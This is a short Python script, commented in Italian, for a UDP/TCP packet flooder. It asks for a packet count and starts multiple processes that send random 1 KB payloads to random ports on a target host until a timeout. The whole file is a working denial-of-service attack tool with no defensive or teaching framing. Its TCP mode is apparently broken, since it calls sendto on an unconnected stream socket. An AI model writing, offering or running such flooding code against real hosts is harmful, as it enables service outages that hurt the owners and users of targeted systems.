import random
import socket
from multiprocessing import Process
import os
from argparse import ArgumentParser
import datetime

# Funzione per chiedere quanti pacchetti inviare
def ask_for_packets_count():
    while True:
        try:
            # Chiede all'utente di inserire il numero di pacchetti da inviare
            packets_count = int(input("Quanti pacchetti vuoi inviare? "))
            if packets_count > 0:
                return packets_count  # Restituisce il numero di pacchetti
            else:
                print("Per favore, inserisci un numero maggiore di 0.")
        except ValueError:
            print("Per favore, inserisci un numero valido.")

def flood(ip: str, udp: bool, port_from: int, port_to: int, times: int, timeout: int):
    data = random.getrandbits(8 * 1024).to_bytes(1024, byteorder="big")
    now = datetime.datetime.now()

    while True:
        port = random.randint(port_from, port_to)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if udp else socket.SOCK_STREAM)
            addr = (str(ip), int(port))
            for _ in range(times):
                s.sendto(data, addr)
            print("Sent to " + str(port) + " process " + str(os.getpid()))
            if (datetime.datetime.now() - now).total_seconds() > timeout:
                break
        except Exception as err:
            print("Error " + str(err))

if __name__ == '__main__':
    parser = ArgumentParser("Simple UDP\\TCP flooder")
    parser.add_argument("host", help="Host (example: 172.16.3.140")
    parser.add_argument("--tcp", help="Use TCP (default: use UDP)", action="store_true")
    parser.add_argument("--port-from", help="Random port min", type=int, default=0)
    parser.add_argument("--port-to", help="Random port max", type=int, default=65535)
    parser.add_argument("--threads", help="Threads count", type=int, default=1)
    parser.add_argument("--timeout", help="Word time, sec", type=int, default=30)

    # Chiedi all'utente quanti pacchetti inviare
    packets = ask_for_packets_count()

    args = parser.parse_args()

    # Usa il numero di pacchetti ottenuto dall'utente
    for _ in range(args.threads):
        Process(target=flood, args=(args.host, not args.tcp, args.port_from, args.port_to, packets, args.timeout)).start()
